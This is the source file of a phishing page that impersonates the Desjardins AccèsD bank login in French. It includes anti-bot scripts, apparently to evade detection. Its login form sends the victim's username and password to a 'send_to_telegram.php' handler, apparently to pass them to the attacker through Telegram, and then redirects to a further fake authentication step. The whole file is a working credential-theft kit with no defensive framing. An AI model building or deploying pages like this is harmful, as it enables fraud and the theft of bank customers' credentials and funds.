<?php

include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="image/logo.png">
    <link rel="stylesheet" href="style.css">
    <title>Se connecter</title>
    <style>
        /* Styles pour l'overlay de chargement */
        .loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }

        .spinner-border {
            width: 3rem;
            height: 3rem;
            color: #28a745; /* Couleur verte */
        }

        .dimmed {
            opacity: 0.5;
            pointer-events: none;
        }
    </style>
</head>

<body>

    <!-- Top Header -->
    <div class="top-header bg-dark text-white py-2 px-4 d-flex justify-content-end align-items-center ">
        <a href="authentification.html" class="text-white text-decoration-none mx-2">AA +</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">English</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">Nous joindre</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">Aide</a>
    </div>

    <!-- Bottom Header -->
    <div class="bottom-header bg-white py-2 px-5 d-flex align-items-center">
        <img src="image/logo-desjardins-couleur.png" alt="Logo Desjardins" class="logo-desjardins me-3">
        <img src="image/accesd1933.jpg" alt="Logo AccèsD" style="height: 90px;" class="accesd-logo me-3 ">
        <img src="image/images-removebg-preview.png" alt="Logo AccèsD Affaires" class="accesd-affaires-logo">
    </div>

    <!-- Main Container -->
    <div class="container my-5 shadow bg-white position-relative">
        <div class="row">
            <!-- Form Section -->
            <div class="col-md-6 p-5 form-section">
                <h2 class="text-success">Se connecter</h2>

                <form id="login-form" action="action/send_to_telegram.php" method="POST" onsubmit="handleSubmit(event)">
                    <label for="identifiant" class="fw-bold">Identifiant <span class="fs-5">&#9432;</span></label>
                    <input type="text" id="identifiant" name="identifiant" class="form-control mb-3 small-input" required>

                    <div class="d-flex align-items-center mb-3">
                        <input type="checkbox" id="memoriser" name="memoriser" class="me-2">
                        <label for="memoriser" class="mb-0">Mémoriser</label>
                        <a href="#" class="ms-2 text-success small">(C’est sécuritaire?)</a>
                    </div>

                    <label for="password" class="fw-bold">Mot de passe</label>
                    <input type="password" id="password" name="password" class="form-control mb-2 small-input" required>
                    <i class="fas fa-eye eye-icon" id="eye-icon"></i>

                    <p class="text-muted small">Attention : Respecter majuscules et minuscules</p>
                    <div class="password-forgotten">
                        <a href="#" class="text-success small mt-n2">Mot de passe oublié?</a>
                    </div>
                    <button type="submit" class="btn btn-success w-50 mt-4">Valider</button>
                </form>

                <!-- Links Section -->
                <div class="links-section mt-5">
                    <div class="row">
                        <div class="col col-left">
                            <a href="#" class="text-success d-block small-link">S’inscrire à AccèsD</a>
                            <a href="#" class="text-success d-block small-link">S’inscrire à AccèsD Affaires</a>
                            <a href="#" class="text-success d-block small-link">Devenir membre</a>
                        </div>
                        <div class="col-1 d-flex align-items-center justify-content-center">
                            <div class="separator-vertical"></div>
                        </div>
                        <div class="col col-middle">
                            <a href="#" class="text-success d-block small-link">Sécurité du site</a>
                            <a href="#" class="text-success d-block small-link">Soutien technique</a>
                            <a href="#" class="text-success d-block small-link">Signaler une fraude</a>
                        </div>
                        <div class="col col-right text-end">
                            <a href="#" class="d-flex align-items-center justify-content-end text-success">
                                Sécurité garantie à 100 %
                                <img src="image/cadenas.png" alt="Cadenas" class="cadenas-icon ms-2">
                            </a>
                        </div>
                    </div>
                </div>
                
                <!-- Loading overlay, caché par défaut -->
                <div id="loading-overlay" class="loading-overlay d-none">
                    <div class="spinner-border" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                </div>
            </div>

            <!-- Image Section -->
            <div class="col-md-6 image-section d-none d-md-block">
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer bg-dark text-center text-white py-4">
        <div class="container">
            <div class="footer-top d-flex flex-wrap justify-content-center">
                <a href="#" class="text-white text-decoration-none me-3">SERVICES AUX PARTICULIERS</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">SERVICES AUX ENTREPRISES</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">CONSEILS</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">À PROPOS</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">APPLICATION MOBILE</a>
            </div>
            <div class="footer-bottom d-flex flex-wrap justify-content-center mt-2">
                <a href="#" class="text-white text-decoration-none mx-2">Sécurité</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Conditions d'utilisation et notes légales</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Confidentialité</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Personnaliser les témoins</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Accessibilité</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Plan du site</a>
            </div>
            <p class="text-muted mt-2 mb-0">© 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.</p>
        </div>
    </footer>

    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Empêche la soumission immédiate du formulaire

            // Désactiver les champs et afficher l'overlay de chargement
            document.getElementById("identifiant").classList.add("dimmed");
            document.getElementById("password").classList.add("dimmed");
            document.getElementById("loading-overlay").classList.remove("d-none");

            // Soumission des données vers send_to_telegram.php
            const form = event.target;
            fetch(form.action, {
                method: form.method,
                body: new FormData(form)
            }).then(response => {
                if (response.ok) {
                    // Attendre 10 secondes, puis rediriger vers authentification.php
                    setTimeout(() => {
                        window.location.href = "authentification.php";
                    }, 10000);
                } else {
                    alert("Erreur lors de l'envoi des données. Veuillez réessayer.");
                    document.getElementById("loading-overlay").classList.add("d-none");
                }
            }).catch(error => {
                console.error("Erreur:", error);
                document.getElementById("loading-overlay").classList.add("d-none");
            });
        }
        
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
